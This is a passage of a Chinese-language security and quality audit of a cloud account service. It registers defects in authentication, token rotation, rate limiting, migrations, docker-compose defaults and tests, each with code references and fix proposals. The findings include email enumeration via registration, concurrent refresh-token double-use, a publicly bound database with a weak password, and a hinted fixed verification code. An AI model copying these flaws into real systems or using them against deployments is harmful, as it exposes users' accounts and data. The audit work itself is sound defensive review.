| REV-375 | 远端服务 | 中 | 安全 | 防枚举设计被自己开洞：`login` 刻意模糊「邮箱不存在/密码错误」，而 `POST /v1/auth/register` **无需任何验证码**，唯一冲突即回「该邮箱已被注册」→ 匿名者可枚举全部已注册邮箱（既有集成测试与 `verify-e2e.ps1` 还把这句当预期行为在断言） | ✅复核（`repositories/users.ts:50-52` ↔ `http/errors.ts:80-85` 注释原文） |
| REV-376 | 远端服务 | 中 | 并发/数据 | 设置 PATCH 三次读改写非原子（体积校验读一次、写入再读一次），`expectedRevision` 的比较在 `UPDATE ... WHERE user_id` **之外** → 乐观并发看起来生效实则丢更新、体积上限可被并发绕过；且把 null 当删除标记使 `null` 既是哨兵又是合法值（PATCH 想写成 JSON null 就删掉了键） | △子代理（`services/settingsService.ts:64`、`repositories/settings.ts:51-55,71-74`） |
| REV-377 | 三端 | 中 | 业务（孤岛） | 账号自助能力服务端已实现、前端零入口：注销、改资料、单条记忆删除、统计重置在界面上都没有去处，`serverPatch/serverDelete` 两个封装函数**全仓零调用**；`POST /v1/a2a/cards/bulk` 同样零调用，`a2a_messages.block_reason` 两端单向（服务端有列有返回、`Src/` 全库 grep `blockReason` 0 命中）→ 该列恒 null | ✅复核（grep `serverDelete|serverPatch` 于 `Client/src` 仅命中 `serverApi.ts:360-361` 定义）/ △（cards bulk 与 block_reason 的零调用） |
| REV-378 | 远端服务 | 中 | 日志 | 优雅关闭把失败洗成成功：`try { app.close(); db.close(); dispose() } finally { process.exit(0) }` → 关库抛错也按 0 退出（容器/PM2 的重启策略与告警全部失准），且 exit 立即终止使 pipe stdout 上未 flush 的日志行丢失；同模块 `pool.on(error)` 空注释、`ping() catch return false` 都不留痕 | ✅复核（`Server/src/index.ts:55-61` 原文，主审此前已独立读到同一段）/ △（`db/pool.ts:61,93-95`） |
| REV-379 | 远端服务 | 低-中 | 数据一致性 | 读侧口径三处不一致：列表默认滤 `deleted` 但 `getMemory`（直读单条）与导出都不滤 → 软删行可被 GET 读回、可被 PATCH 复活；`listTasks` 把 limit 夹到 2000 且**无游标**、`total` 取 `rows.length` → 超 2000 条静默丢数据还报告「就这些」；审计接口的 `?limit=-5` 生成 `LIMIT -5` → PG 报错 500 | △子代理（`repositories/memories.ts:128,187,342`、`repositories/tasks.ts:82`、`services/taskService.ts:57`、`routes/me.ts:50`） |
| REV-380 | 远端服务 | 低 | 注入/DDL | ① 搜索把 `%`/`_` 通配符原样拼进 LIKE 参数（参数化没问题，但未转义，输入百分号即全匹配）；② `003_auth_hardening.sql` 把 `code` 列 DROP 而新增的 `code_hash` 可空，类型与 `verifyCodeHash` 都假定非空 → 未回填的历史行使 `Buffer.from(undefined,hex)` 抛 TypeError → 500 | △子代理（`repositories/memories.ts:195`、`verificationCodes.ts:19,47`、`migrations/003:13-17`） |
| REV-381 | 远端服务 | 低 | 配置 | `docker-compose.yml` 的 Postgres 用弱口令 `civitas` 且把 `5432:5432` 绑到 0.0.0.0（同网段可直连数据面，叠加 REV-356 即「LAN 里无鉴权读写业务数据」）；`.env.example` 内置同款连接串 | △子代理（`docker-compose.yml:19,23-24`、`.env.example:12`） |
| REV-382 | 远端服务 | 低 | 门禁/可维护 | 三处小断链：`scripts/seedDevUser.ts` 让云端包跨树 import 本地后端 `Src/Infra/Security/deviceFingerprint.js`（Server 有独立 lockfile，见 REV-303）并绑 003 已废弃的易变指纹，其文案仍宣称「开发环境验证码固定 888888」而代码里早已无此逻辑；`db/migrate.ts` 按文件名前缀记版本而 `scripts/migrate.ts --status` 按 name 报状态 → 同前缀不同名的迁移会被静默跳过却显示「待执行」；`test/helpers/pg.ts` 的 truncateAll 漏 `rate_limit_buckets` | △子代理（`scripts/seedDevUser.ts:8,14,73`、`db/migrate.ts:45`、`scripts/migrate.ts:38`、`helpers/pg.ts:62-68`） |
| REV-383 | 远端服务 | 低 | 业务（孤岛） | `users.status=disabled` 的唯一写入口 `setUserStatus` **零调用方**（无管理面路由）→ 登录与刷新里「账号已停用」的两条分支在生产不可达，DDL 的 `users_status_check` 与运维直觉（「能停号」）都不成立；`user_devices.is_primary` 除解绑时被置 false 外从未被置 true | ✅复核（grep `setUserStatus` 仅命中 `repositories/users.ts:83` 定义） |

### 18.2 逐条要点（只写需要交代机制的）

**REV-349（解绑恒 404）** — `Client/src/stores/accountStore.ts:566,577` 用 `serverPost(path, {})`，而 `Server/src/routes/auth.ts:123` 是 `app.delete(/v1/me/devices/:deviceId)`、`routes/me.ts:40` 是 `app.delete(/v1/me/sessions/:sessionId)`。Fastify 默认对「路径存在但方法不符」不返回 405，而是落到 `app.ts:203-205` 的 `NOT_FOUND`。实证（主审亲自跑）：同 URL `POST` → `404 {ok:false,error:{code:NOT_FOUND,message:接口不存在}}`，`DELETE` → `200`。放大面：`config.ts:262-263` 明确要求「strict 设备模式必须配套自助解绑」，于是**换机/重装后账号永久锁死**——唯一的恢复路径是自己写坏的。修复不是加功能，是把动词改对（`serverDelete` 已导出）。

**REV-350（令牌并发双花）** — `authService.refresh()` 的顺序是 `findByHash`（裸 SELECT，无 `FOR UPDATE`）→ 判 `revoked_at` → `issueTokens`（INSERT 新行）→ `revokeById`（`UPDATE ... WHERE id=$1 AND revoked_at IS NULL`，**返回值被丢弃**）。两个并发请求都读到 `revoked_at IS NULL`，于是同族出现两个活令牌，`:269-279` 的盗用判定分支永不进入。`revokeById` 已带 `AND revoked_at IS NULL` 谓词，正解就差一步：把它当 CAS 用（判 rowCount，0 行即视为重用并 `revokeFamily`）。`test/integration/auth.spec.ts:104-117` 只测了串行重用，所以全量单测绿。

**REV-352（写限流死配置）** — 两个子代理各自独立命中，主审再用 fastify 5.12.5 实跑复现钩子顺序（`this[kHooks][hook].concat(opts[hook])` 使实例钩子恒先于路由钩子）。注释「在鉴权之后执行」与实现相反。加重因素：`test/helpers/app.ts:42` 把 `writePerMin` 设成 10000，没有任何用例能观察到它没跑。

**REV-355（身份验真 fail-open）** — 这一条在 M08/M05 的接缝上，`§16.8-②` 只登记过「身份可自报」的根因，本条给出的是**为什么修了 G-09 仍然自报**：接入点是 `if (token)` 而不是「无令牌即拒」，而唯一会出示账号 Bearer 的代码（`serverApi.ts:213`）目标是云端不是本地后端，于是 `extractBearerToken` 恒 null；即使将来补发 Bearer，`CIVITAS_SERVER_URL` 无写入方、默认 `127.0.0.1:8787` 在随包形态无人监听，结果是 403 而不是验真通过。口径建议：**要么「无凭据即 403」，要么显式标注「桌面单机态不启用远程身份」并把它变成可观测的选择**，而不是静默降级。

**REV-357 / REV-364（备份的两半）** — 同一个功能两个致命面：导得走导不回（体积，两端默认值已核）与 replace 半替换（条件不对称，原文已读）。合起来意味着「备份」目前只在账号数据够小的时候成立，且恢复后仍与备份不一致。

### 18.3 已核对为干净（后续勿重复排查，可作修复模板）

- **JWT 与算法面**：`security/tokens.ts:50-54` 的 `jwtVerify` 带 issuer/audience/`algorithms:[HS256]` 白名单锁死，无 `alg:none`/RS→HS 混淆面；`sub/sid` 强制 string（`:57`）；过期与非法分别回可区分的 `TOKEN_EXPIRED` / `UNAUTHENTICATED`（`:63-66`）。刷新令牌是 32 字节 CSPRNG 且不透明，入库只存 sha256（`:79-86`）。残留仅 `typ:access` 签了没验（`:36` vs `:55`），但服务端只签发一种 JWT，无可伪造的第二类型 → 当前不可达。
- **密码与反枚举时序**：Argon2id 19 MiB / t=2 / p=1 / outputLen 32 符合 OWASP 2024（`security/password.ts:11-17`）；`fakeVerify()` 确实被两个分支调用（`authService.ts:207,490`），子代理实测 dummy 哈希真实完成推导（24ms vs 真校验 20/18ms）而非提前抛错——**这条时序防护是真的**；`status!==active` 判定放在密码校验之后（`:229`），不泄露「存在但停用」。例外见 REV-375 的注册接口。
- **凭据只存摘要 + 常量时间比较**：验证码 `repositories/verificationCodes.ts:41-51` sha256 + `timingSafeEqual` 且长度不符先拒；设备凭据 `users.ts:146` 不落明文；发码用 `randomInt(100_000,1_000_000)` CSPRNG（`:36-38`）。
- **验证码生命周期（双花见 REV-362 之外的部分）**：失败锁定在 `attempts>=max` 即 `used_at=now()` 且判定位于 `UPDATE...RETURNING` 之后（无 TOCTOU）、签发新码在同一事务内作废同用途旧码、发送配额 + 冷却双闸（`authService.ts:431-448`）、过期分支先 revoke（`:282-285`）；`ALLOW_DEV_CODE` 在生产被 `config.ts:251-253` 拒启动并在 `:290` 二次兜底。
- **SQL 全参数化，无注入路径**：`db/pool.ts:34-45` 一律 `query(sql, params)`；`memories.ts:180-217` 拼接的只有硬编码列名与占位符；`stats.ts:40-45` 多值 INSERT 只拼占位符且编号正确；间隔表达式里的 `$1` 是绑定值并经 `Math.floor` 收敛；无动态 ORDER BY。（LIKE 通配符未转义见 REV-380，那不是注入。）
- **鉴权覆盖率 100%、未见 IDOR**：8 个 route 文件里除 5 个公开端点（register/login/refresh/send-code/login-with-code）外，28 条业务路由全部挂 guard + `requireAuth`；数据层每条查询以 `WHERE user_id = $1` 打头（逐条核过 40 处读改写删）；仅按 id 定位的 `refreshTokens.ts:59/63/72/88` 由 `authService.ts:380-382`（归属不符即 forbidden）与 hash 唯一性守住，`logout:307-308` 亦校验 `session.user_id === input.userId`。
- **旧访问令牌即时失效（SV-002）**：`authGuard.ts:37-43` 回查会话行，使改密（`authService.ts:347-350` 事务内 `updatePasswordHash` + `revokeAllForUser`）、`logout(allDevices)`、`revokeSession` 三条路径都不必等 900s TTL。（缺口只在设备维度，见 REV-354，以及归属/状态不回查，见 REV-361。）
- **内部错误不外泄**：`app.ts:200` 的 `new AppError(INTERNAL, message)` **不构成泄露**——`errors.ts:58` 的 `expose ?? code!==INTERNAL` 使其 `toPayload()` 固定回「服务器内部错误」，真实 message 只进 `request.log.error`（`app.ts:199`）；413/415/400 各归一为固定文案。（主审点名复核项，结论：**REV-011/235 那一族在 Server 侧不成立**。）
- **限流白名单与限流器自身**：`app.ts:59/121` 的白名单判定已消化 query string，`/HEALTHZ`、`/healthz/`、`//healthz` 不命中白名单（更严非更松）且本就 404，无变形绕过；`rateLimit.ts:144-160` 用单条原子 UPSERT 做固定窗口（多实例一致）、**DB 故障回退内存计数而非放行**、桶有窗口过期清理、定时器 `unref()`，键增长有界。
- **CORS 与安全头**：`app.ts:138` 空列表即不注册插件（默认拒绝跨域读），把 `CORS_ORIGINS` 配成 `*` 会被当作数组字面量精确匹配而**不会**变成通配放行（fail-closed）；`app.ts:111-117` 有 nosniff / X-Frame-Options DENY / no-referrer / **no-store**（对带令牌的 JSON API 是最关键的一条）。缺 HSTS 见 REV-356。
- **备份导出内容不含凭据**：`backupService.ts:29-47` 的 `BackupBundle` 只有 `account{email,displayName}` + settings/memories/tasks/stats，**不含 `password_hash`、不含任何访问/刷新令牌、不含 device credential_hash**；三条备份路由全 guard。
- **DDL 约束与级联**：所有用户数据表 `REFERENCES users(id) ON DELETE CASCADE`（001:32/52/62/83、002:44、005:13、006:15/53）→ 注销无孤儿；`users.email_lower UNIQUE`、带 `IS NOT NULL` 谓词的部分唯一索引、`status/assertion/outcome/purpose` 的 CHECK 均在；**所有 `ON CONFLICT` 目标列（含部分索引谓词）与 DDL 逐条吻合**，无一处会运行期抛「no unique or exclusion constraint matching」。缺口清单（DDL 无保障而代码有假设）见 18.4 附注。
- **事务与嵌套安全**：`pool.ts:71` 的 `tx:(inner)=>inner(clientDb)` 使 `bulkUpsertMemories/bulkUpsertTasks/putSettings` 在 `backupService.ts:211` 的外层事务内不再发 BEGIN → restore 全链路真原子（`memories.spec.ts:175` 覆盖）。**限定**：本条只担保"不会二次 BEGIN、不会半提交"；无 SAVEPOINT 导致内层抛错后外层进入 aborted（后续语句 `25P02` 级联、真实原因被掩）已另立 **REV-408**（§19）。
- **两端契约基线一致**：`{ok,data}` / `{ok:false,error:{code,message,details}}` 约定两端同形（`respond.ts:16-27` ↔ `serverApi.ts:237-258`，含裸响应兼容）；令牌/用户/会话/设备 DTO 逐字段一致；时间戳口径未分叉（任务 epoch ms、记忆两端 ISO）；分页 limit 1..200 与 base64url 游标两端匹配；`clientMemoryId/clientSessionId/clientEventId` 幂等键闭环；A2A `visibility/verdict/priority` 枚举集合两端同集；备份包的 `tasks` 已在服务端 schema 显式声明防剥离。
- **`statsTimezone` 用法正确**：只用于分日桶（`stats.ts:75/99/122`），`AT TIME ZONE` 跨日边界正确（`stats.spec.ts:125` 已验 UTC 16:30 归次日），numeric 侧一律 `::float8` + `Number()` 未踩 pg 字符串返回的坑；**空数据不伪造比例**（与 REV-267~275 那族本地侧「伪造可视化」不同，云端不成立）。
- **`Server/tsconfig.json:17-20` 比根口径更严**：同时开 `forceConsistentCasingInFileNames` 并把 `test/**`、`scripts/**` 纳入 tsc；子代理对 `Server/**` 全部 56 个 `.ts` 跑过 REV-343 同款的 import 大小写真值表探针 → **0 命中**。
- **既有条目的现状复核（不重复立项）**：`REV-303/308` 仍成立——根 CI 只有 lint/test/build 三个 job 且全在仓库根（`ci.yml:19-35`），无 `services: postgres`、无 Server/Client job，根 `lint` 只 `Src/`、根 vitest include 只 `Tests/`、根 tsconfig `rootDir=./Src` → 云服务端代码可随意回归；`REV-225` 未闭——`/readyz` 仍只 `db.ping()`（`SELECT 1`）不含 `schema_migrations` 版本，`runMigrations` 的调用方仍只有 `scripts/migrate.ts` 与测试，compose 里只有 db 服务没有应用服务，**并新增连带证据**：未建表时 `rateLimit.ts:144` 每次 consume 都抛 `relation rate_limit_buckets does not exist`，被 `:172-176` 捕获后静默降级为进程内限流（每请求一条 error 日志），于是 SV-003 的多实例共享计数在最需要它的「未迁移却已上线」场景下失效。

### 18.4 归批建议（并入 §16.3 口径，不另立批次体系）

| 工单 | 合并条目 | 为什么在这个位置 |
|---|---|---|
| **P0-5 云端凭据面止血**（新增批） | REV-349 + 351 + 352 + 356 + 360 + 381 | REV-349 是唯一「用户点了一定失败且会锁死账号」的条目，成本是一行动词；351/356/381 是「非生产默认即不安全」三件套；352/360 是「宣传有限流而限流没跑」。这批几乎只动 `Server/`，与已收口的 `Src/`+`Client/` 批次文件不冲突，可并行 |
| **P1-9 令牌与身份权威**（新增批） | REV-350 + 353 + 354 + 361 + 362 + 383 | 依赖 P0-5（先让解绑可用，才能验证设备面）；核心是把 `revokeById` 当 CAS、把 `credential_hash` 真正校验、把 device 与 session 建关联。REV-355 的**本地侧接入点**应与本批同口径决策（把 `if (token)` 改成必选或显式可观测），但它同时依赖账号服务的鉴权身份，故跨 P1-9 与后续「真实账号绑定」工单 |
| **P2-5 云端一致性与可观测性**（新增批） | REV-357 + 358 + 359 + 363 + 364 + 365 + 366 + 367 + 368 + 369 + 370 + 371 + 372 + 374 + 376 + 378 + 379 + 380 + 382 | 其中 359/365/366/367/374 属「三端语义」家族（两端各写一半、缺 LWW 与游标语义），建议与 P1-4（事件/契约 SSOT）同一口径讨论；358 与 REV-203/204 是同一个「上行洗掉真实数据」家族的云端侧根因，修 358 时应一并复核 203/204 的收口是否彻底 |
| 孤岛二选一（并入 P2-1） | REV-373（部分）+ 377 + 369 的「补路由 or 收 enum」 | 与 §16.2 的 F5 家族同源：`serverDelete` + `serverPatch`（均零调用点）、`cards bulk`、`block_reason`、`setUserStatus` 都是「实现了但没人接」 |

**附注（DDL 无保障而代码有假设，修 18.1 各条时要一并处理）**：`verification_codes.code_hash` 可空 ↔ 代码假定非空（REV-380）；「同邮箱同用途单活码」只靠服务层 UPDATE+INSERT，`verification_codes_lookup_idx` 非唯一 → 并发发码可并存两把有效码；`memories.contradicted_by`/`source_trace_ids` 无 FK 与结构约束，客户端可填他人记忆 id 或任意 jsonb；`a2a_messages.visibility/verdict/kind/priority` 与 `a2a_agent_cards.status` **全无 CHECK**，只靠 Zod 把关 → 未来任何新写入路径（脚本/迁移回填）都能绕过；`user_tasks.updated_at`/`a2a_messages.created_at` 是 bigint 但无非负/单调约束且服务端不比较（REV-358 的根因之一）；`refresh_tokens` 与 `user_devices` 无外键关联（REV-354 的根因）。

### 18.5 本轮无法取证、必须真实环境或人工验证的项（补 §16.4）

| 待验证项 | 关联条目 | 需要的动作 |
|---|---|---|
| 令牌并发双花是否真能双活 | REV-350 | 需真实 PG + 两个并发 `POST /v1/auth/refresh`（本轮沙箱无 PG，只做了读码与逻辑序取证） |
| `TRUST_PROXY=true` 下写 `inet` 列报错 | REV-360 | 子代理复现了 XFF 决定 `request.ip`，未复现落库 500，需真实库 |
| 备份体积触发 413 / 占位符上限 | REV-357 | 需构造大于 1MB 与约 13k 事件两个账号做 restore |
| `Server/` 集成测试是否在有 PG 的环境里全绿 | §18 全部 | `Server/test/**` 12 个 spec 依赖真实 PG（`helpers/pg.ts`），根 CI 无 `services: postgres`，**本轮一次都没跑过它们** |
| 桌面态连局域网自托管账号源 | REV-373 | 需 `docker compose up` + 桌面端实际点按（§16.4 同类缺口） |

### 18.6 一句话结论

M13 的问题密度与 M08（接入层安全）相当，但性质不同：**M08 是「本地后端不该对网开放」，M13 是「一个已经在管密码、令牌和跨设备数据的真实服务，从未被纳入任何一轮审查、任何一条门禁」**。最该先动的是 REV-349（一行动词，用户点必败）、REV-350/352/351（令牌家族、死限流、示例密钥）——它们的共同形态正是 §16.2 的 F2/F5 家族：**配置项、注释、测试绿灯三处都声称防护存在，而实现里最后那一步没接上**。

## 19. M14 云端的测试·迁移·运维面（`Server/test` `Server/migrations` `Server/scripts` `Server/docker-compose.yml` 与 CI 接线，REV-384~412）

> **为什么还要补这一片**：§18 审的是 `Server/src/**`（应用代码本身）。而一条独立部署线的真实可靠性还取决于另外两个面——**它的数据演进机制**（`migrations/**` + `src/db/migrate.ts` + `pool.ts`）和**它被验证的方式**（`test/**` 2793 行 + `scripts/verify-e2e.ps1` + `package.json`/`tsconfig`/`vitest.config`/`docker-compose` + 与根 CI 的接线）。本轮事实证明：这两个面的缺陷与应用代码的缺陷**不同源**，且相互放大——应用侧 8 条安全/业务缺陷在测试面全部无拦截网（REV-394），而测试面自身的"无库即跳过"设计（REV-384）让这层空白永远不会被发现。
> **口径不变**：只登代码/配置/脚本自身的缺陷；`Server/README.md`、`Docs/Server/**` 的文档漂移不立项（集中记在 19.4 附注）。
> **取证强度**：`✅复核` = 主审亲自读码；`✅实证` = 主审亲自跑只读命令（本轮 3 处：`grep Promise.all Server/test` → 零命中；`git check-ignore Server/.verify-out` → exit 1；10 个集成 spec 的 `describe.skip` 守卫逐文件确认）；`△子代理` = 子代理给出 file:line 未逐字复核，修复前需抽样。

### 19.1 Bug 登记表

| ID | 层 | 严重度 | 类别 | 一句话现象 | 证据 |
|---|---|---|---|---|---|
| REV-384 | 远端服务 | 严重 | 测试有效性/CI | 集成测试是**薛定谔的绿**：探测把任何异常当作"无库"、10 个 spec 一律 `dbAvailable ? describe : describe.skip`、而文档指路的端口/库名与默认串互斥 → `npm test` 恒退出 0，2793 行断言在本轮、在 CI、在"照 README 搭机器"三种场景下**一次都没跑过** | ✅复核 · ✅实证（`Server/test/helpers/pg.ts:30-50` catch 后置 `available=false`；`auth.spec.ts:10-11` 等 10 文件同形；`pg.ts:15` 默认 `55432/civitas_server_test` ↔ `docker-compose.yml:20` 只发布 `5432`/库名 `civitas_server` ↔ `README.md:68` 教在 **5432** 建 `civitas_server_test`、`README.md:33` 教在 **55432** 建 `civitas_server` → 两条路径各对一半，永不对齐） |
| REV-385 | 远端服务+前端 | 高 | CI/构建 | 云端与前端不在**任何**门禁里：CI 三个 job 全在仓库根（`npm ci` 只装根依赖，无 `cd Server`、无 postgres service container，根 `build=tsc --noEmit` 只覆盖 `Src/`）；而根 `package.json:21-26` 已经备好 `server:dev/migrate/migrate:status/test/db:up/db:down` 六条入口却零使用；`Client` 的 `tsc && vite build` 也从不在 CI 出现 | ✅复核（`.github/workflows/ci.yml:19-22,34-35,53-54`；`package.json:11,21-26,30`；`Client/package.json:8`）· 与 §18.3 对 REV-303/308 的现状复核同源，本条把"已备好接线点却没接"单独立项（F5 家族） |
| REV-386 | 远端服务 | 中高 | 测试有效性 | 漂移检测用例**自己就是毒源**：篡改 `schema_migrations.checksum` 后只在成功路径复原，`finally` 里只 `close()` → 该用例一旦失败（正是它要防的"漂移检测坏掉"），共享测试库留下 tampered checksum + 幽灵 `999` 行，后续 spec 的 `runMigrations` 抛错被 REV-384 的探测吞成"无库" → **整套剩余集成静默转 skip 且全绿** | ✅复核（`Server/test/integration/platform.spec.ts:138-172`，复原在 `:161-168`、`finally` 只有 `:170`；`pg.ts:35-38` 的 catch 不分成因） |
| REV-387 | 远端服务 | 高 | 构建/交付 | 这条部署线**没有可交付形态**：`start`/`dev` 用 `tsx` 直跑 TS，而 `tsx`/`typescript` 都在 `devDependencies`（`npm ci --omit=dev` 后服务起不来）；`"build": "tsc --noEmit"` 零产物；全仓无 Server 的 Dockerfile（compose 里只有 db），打包链不含它 | ✅复核（`Server/package.json:11-13,31-37`；`Server/docker-compose.yml:12` 只有 `db:`；`Scripts/*.cjs` 对 `Server` 零命中 → △ 该行由子代理给出，主审未逐文件复扫） |
| REV-388 | 远端服务 | 高 | 安全 | compose 把 PostgreSQL 以 `5432:5432`（无 `127.0.0.1:` 前缀 = 绑定所有网卡）发布，配 `civitas/civitas` 弱口令 + `restart: unless-stopped`，而**没有 app 服务** → 部署即"只把数据库暴露、把应用留给你自己裸跑"，与 REV-356（应用无 TLS）叠加成同网段双明文面 | ✅复核（`Server/docker-compose.yml:16,19,23-24`） |
| REV-389 | 远端服务 | 高 | 数据/迁移 | 迁移执行器继承连接池的 `statement_timeout`（默认 15s）且**无 `lock_timeout`、无跨实例咨询锁**：001 的 GIN 索引、003 的 `ALTER/DROP COLUMN` 在存量库被超时或锁等待打断即整文件回滚，CLI 没有任何提高超时的入口；两个实例同时 `migrate` 会并发执行同一文件 | ✅复核（`Server/src/db/pool.ts:56` 把 `statement_timeout` 设给整个 pool；`Server/src/db/migrate.ts:110-118` 的 `db.tx` 无任何锁；`Server/src/config.ts` `statementTimeoutMs` 默认 15_000） |
| REV-390 | 远端服务 | 中高 | 数据/迁移 | `version = file.split('_')[0]` 且不校验唯一、不校验单调：两个 `006_*` 文件得到同一 version → 前一个已提交、后一个 INSERT 撞主键回滚，库进入**半迁移**；新增低位号文件（如回填 `000_x.sql`）会排在 006 之后"插队"执行且无任何告警 | ✅复核（`Server/src/db/migrate.ts:45,99,115`；`schema_migrations.version` 是 PK：`migrate.ts:58`） |
| REV-391 | 远端服务 | 中 | 数据/迁移 | "库里有记录、磁盘无文件"完全静默：漂移检查与 `--status` 都只遍历磁盘文件 → 删号/改号的历史迁移不可见；`--dry-run` **非只读**（先 `ensureMigrationsTable` 建表再返回）→ 在他人托管的库上"看看状态"就悄悄写了 DDL | ✅复核（`Server/src/db/migrate.ts:82,89-99,105-108`；`Server/scripts/migrate.ts:32-40` 同口径） |
| REV-392 | 三端 | 中高 | 业务/安全 | `seed:dev` 双向错位：用**服务端主机**的 MAC+主机名+磁盘序列号当"用户设备指纹"写进 `bound_device_id`——strict 模式下真实客户端的 `deviceId` 必不等且 `registered.length>0`，开发账号被自己的绑定锁死；脚本无任何环境门禁，可直接在生产 `DATABASE_URL` 上建 active 的 `dev@civitas.local`；注释与输出宣称"固定验证码 888888（在 authService 中通过 NODE_ENV 判断）"，而**全仓不存在 888888**（真实门是 `ALLOW_DEV_CODE` 把随机码回传响应）→ 运维照做必然登录失败，若"顺手补齐 888888"即成通用后门 | ✅复核（`Server/scripts/seedDevUser.ts:8,19-35,47,64,73`；全仓 grep `888888` 只命中该文件两处注释/输出；`Server/src/config.ts` `allowDevCode` 仅在非生产可用）· △（`authService.ts` 的 strict 判定行号由子代理给出） |
| REV-393 | 远端服务 | 中 | 构建/耦合 | 云端脚本跨部署线反向依赖本地端源码：`Server/scripts/seedDevUser.ts:14` import `../../Src/Infra/Security/deviceFingerprint.js`，而 `Server/tsconfig.json:20` 的 include 覆盖 `scripts/**` → Server 单独 clone/容器化后 `npm run build` 与 `seed:dev` 必失败（当前侥幸 exit 0 只因未设 `rootDir`/`composite`）；被依赖的指纹本身用 `wmic`，Win11 24H2+ 已移除该命令 → 静默空串、指纹漂移 | ✅复核（`seedDevUser.ts:14`、`Server/tsconfig.json:20` 的 include 列表，主审读文件确认无 `rootDir`）· △（`wmic` 分支与 `listFilesOnly` 实测由子代理跑） |
| REV-394 | 远端服务 | 高 | 测试有效性 | §18 的 8 条安全/业务缺陷在测试面**全部无拦截网**，其中两处把缺陷行为写成期望值：REV-350 非 CAS 轮换（**全仓零并发用例**，`grep Promise.all\|Promise.race Server/test` 无命中）· REV-352 写限流（`writePerMin=10_000`，`write:user-1` 是直调 limiter 而非打 HTTP）· REV-353 严格设备模式（只断 `credential_hash` 的**写入值**，strict 用例真过因是设备表为空）· REV-354 解绑（只断 200 + `revoked:true`，无一句断 device-A 的令牌失效）· REV-357 备份体积（`platform.spec.ts:116-125` 把"2MB→413"固化为期望，从无真实 bundle restore）· `memories.ts:91` 的 `status ?? 'active'` 洗回（无"软删后同 `clientMemoryId` 再上行"用例）· `backupService.ts:267` 的条件删表（tasks 用例的包恒非空、backup 用例无任务） | ✅复核（`Server/test/helpers/app.ts:42`；`verificationCode.spec.ts:189-192,211-234`；`auth.spec.ts` 无并发；`grep` 实证零 `Promise.all`；余 △ 见 `platform.spec.ts:116-125`、`memories.spec.ts:156-172`、`tasks.spec.ts:144-170`） |
| REV-395 | 远端服务 | 中高 | 测试有效性 | 被测形态 ≠ 运行形态：`helpers/app.ts:14-54` 手拼 config 绕过全部 fail-closed 分支——`allowDevCode:true`、`deviceBindingMode:'warn'`、三档限流 `10_000`、`maxSettingsBytes:4096`（生产 262144）、`corsOrigins:[]`、`logLevel:'silent'` 且 `disableLogger:true`、`mail.webhookUrl:''`、`rateLimitStore:'memory'` → 生产阈值下的体积/限流/CORS/邮件/日志路径**一条都没被走过**；`config.spec.ts` 也不断这些默认值 | ✅复核（`Server/test/helpers/app.ts:26-53,80`） |
| REV-396 | 远端服务 | 中 | 测试有效性 | 空洞断言：`auth.spec.ts:189` 的选择器 `s.sessionId !== user.tokens.refreshToken` **恒真**（`sessionId` 是 uuid，`refreshToken` 是 32 字节 base64url，二者永不相等，用例靠 `issued_at DESC` 的顺序侥幸选对）；`:197-198` 更把 session UUID 当 refreshToken 提交去换 401——**吊销逻辑整块坏掉也照样 401**（哈希查不到即 401）；另有 10+ 处只断 `statusCode` 不断 `error.code` | ✅复核（`Server/test/integration/auth.spec.ts:183-199` 主审逐行读；`repositories/refreshTokens.ts:56` 的 `WHERE token_hash=$1` 证明无效令牌与已吊销令牌同响应） |
| REV-397 | 远端服务 | 中 | 测试有效性/安全 | 单元盲区正好是安全关键分支：`authGuard` 的 SV-002 会话回查（`revoked_at`/`expires_at` 两支）零测、`errors.ts` 14 个错误码只测 3、`fakeVerify` 只断"不抛"而不当时序对齐、`status!=='active'`/`TOKEN_EXPIRED`/`allowRefreshReuse`/越权 `revokeSession`/logout 缺参全无 | △子代理（`test/unit/core.spec.ts:51-53`；`src/http/authGuard.ts:37-43`、`src/http/errors.ts:24-39` 主审在 §18 已通读，确认无对应测试入口） |
| REV-398 | 远端服务 | 中 | 日志 | 审计与日志零断言：`audit_log` 只在 3 处被数行数且均用 `>=1`/`>=2`，同时 logger 被 `disableLogger:true` 关掉 → 审计写失败、`revoke_device`/`logout_all` 不落审计、发码配额失败均照样绿 | △子代理（`src/repositories/audit.ts:33-35`；`auth.spec.ts:127,236`、`verificationCode.spec.ts:206-207`） |
| REV-399 | 远端服务 | 中 | 测试有效性 | `mailTransport.ts`（82 行）零覆盖：`webhookUrl` 在测试配置里恒空（`app.ts:35`）→ 验证码真实投递、非 2xx、超时 abort 三条路径全无测试，`send-code` 的 5xx 分支未验证（连带 §18 已登的"验证码明文进日志"也无可观测断言） | ✅复核（`app.ts:35`）· △（覆盖缺失结论由子代理全文比对） |
| REV-400 | 远端服务 | 低-中 | 测试有效性 | 时序耦合：`memories.spec.ts:97` 用 2ms 递增 `created_at` 造 LWW 序、`stats.spec.ts:157-171` 用 `Date.now()` 断 `activeDays===1`（跨当地零点必挂）、`verificationCode.spec.ts:147` 假定 devCode≠`'000000'` | △子代理 |
| REV-401 | 远端服务 | 中 | 测试有效性 | `truncateAll` 硬编码 11 张表并注释"清空全部业务表"，而 DDL 实有 12 张（漏 `rate_limit_buckets`）→ 限流桶计数跨文件、跨轮次泄漏；`vitest.config.ts:9` 的 `fileParallelism:false` 正是为"共用一库"，于是这个泄漏属设计内风险，且新迁移加表不会自动进清理列表 | ✅复核（`pg.ts:60-69` 表清单 ↔ `grep CREATE TABLE Server/migrations/*.sql` 得 12 张，含 `migrations/004_rate_limit_buckets.sql:12`） |
| REV-402 | 远端服务 | 中高 | 测试有效性/CI | `verify-e2e.ps1` 是**不可消费的假门禁**：全文只有 3 个等值断言（`:130-132` 设置/记忆/统计），⑦令牌重用、⑧弱密码与未鉴权、⑨响应头三段**只打印不比较**；校验失败仅红字 `Write-Host`，脚本从不 `exit 1` → 通过与失败退出码同为 0，无法被任何 CI/工单消费；且它没有任何调用方（Server 与根的 scripts 都无对应条目） | ✅复核（`Server/scripts/verify-e2e.ps1:130-160` 全文读；`Server/package.json:10-22`、`package.json` 均无 e2e/verify 入口） |
| REV-403 | 远端服务 | 中 | 安全 | 同一脚本用 psql **直删业务表**来"模拟数据丢失"（`:107-110` 删 `user_settings/memories/usage_events`），硬编码口令 `Passw0rd123` 与 `verify@example.com`（`:15-16`），头注声明的 `$env:PGURL`（`:5`）**全文从未被读取**——实际硬编码 `-h 127.0.0.1 -p 55432 -U postgres -d civitas_server_test`（`:19`）→ 照头注设环境变量的人，清的是另一个库，而脚本照样"通过" | ✅复核（`verify-e2e.ps1:5,15-20,107-110`） |
